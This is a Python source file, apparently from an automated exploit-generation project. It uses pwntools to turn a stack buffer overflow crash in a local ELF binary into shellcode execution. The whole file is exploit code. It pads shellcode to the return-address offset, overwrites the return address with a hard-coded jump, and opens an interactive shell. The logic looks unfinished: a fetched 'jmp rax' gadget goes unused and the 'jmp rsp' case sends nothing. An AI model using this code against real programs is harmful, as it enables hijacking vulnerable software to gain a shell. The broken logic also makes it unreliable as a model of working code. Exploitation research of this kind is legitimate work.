from pwn import *
from elftools.elf.segments import Segment
from binary.shellcode import Shellcode

context.log_level = 'DEBUG'


class ShellcodeExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.inputs = []
        self.controlled_stack_space = 0
        self.vuln_buf_addr = 0x0
        self.parse_vuln(vuln_details)
        self.shellcode = Shellcode(self.binary)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.controlled_stack_space = vuln_details["ctrl_stack_space"]
        self.vuln_buf_addr = vuln_details["vuln_buf_addr"]
        self.inputs = vuln_details["input"]
        self.output = vuln_details["output"]

    def apply_crash_input(self, process, rop):
        current_output = b""
        for i, input in enumerate(self.inputs):
            current_output += process.clean_and_log()
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                chain_length = len(input)
                log.info("total payload length: {}".format(chain_length))
                offset = input.index(ip)
                log.info("buffer offset: {}".format(offset))
                exploit_entry_input = input[0:offset]
                # seg_rwx : Segment = self.binary.get_rwx_segment()
                # print(seg_rwx)

                jmp_rsp = rop.jmp_rsp

                if jmp_rsp is None:
                    jmp_rax = rop.find_gadget('jmp rax')

                    rop.raw(self.shellcode.content.ljust(offset, asm(shellcraft.nop())))
                    rop.raw(pack(0x00000000004010dc))

                    chain = rop.chain()
                    process.sendline(chain)

        current_output += process.clean_and_log()
        log.info("current output: {}".format(current_output))
        self.last_output = self.output.replace(current_output, b"")
        log.info("last output: {}".format(self.last_output))

    def exploit(self):
        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')

        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop)

        process.interactive()
